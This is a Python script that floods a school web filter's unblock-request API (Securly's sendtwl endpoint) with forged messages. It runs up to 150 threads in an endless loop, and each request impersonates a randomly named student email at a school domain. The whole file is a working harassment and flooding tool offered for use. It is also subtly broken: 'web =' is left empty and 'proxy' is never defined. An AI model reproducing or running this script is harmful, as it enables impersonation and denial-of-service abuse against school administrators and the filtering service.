import requests
import random
import threading
import names
import string
from termcolor import cprint
web = 
def do_request():
  while True:
      name = (names.get_full_name()).replace(" ", ".").lower()
      print('Sent Message')
      data={
      'categories': "Games",
      'keyword':"",
      'blockedReason': "site",
      'policy:': "Base/Default Policy",
      'requesterOU': "-",
      'requesterSafeSecGroupName': "-",
      'requester': name + "@SchoolEmailExtension", # example: @school.org
      'fid': "SchoolEmail", # example admin@school.org
      'i2n':''
      }
      cprint(requests.post("https://useast-www.securly.com/app/api/sendtwl", data=data).json(), 'blue')
      cprint(f"message sent with proxy {proxy} disguised as {name}@SchoolEmailExtension", 'green')
  threads.pop(0)
threads = []
concurrentThreads = 150 # The more the faster but program is more prone to crashes and lag
while True:
  if len(threads) <= concurrentThreads: 
    thread = threading.Thread(target=do_request)
    threads.append(thread)
    thread.start()
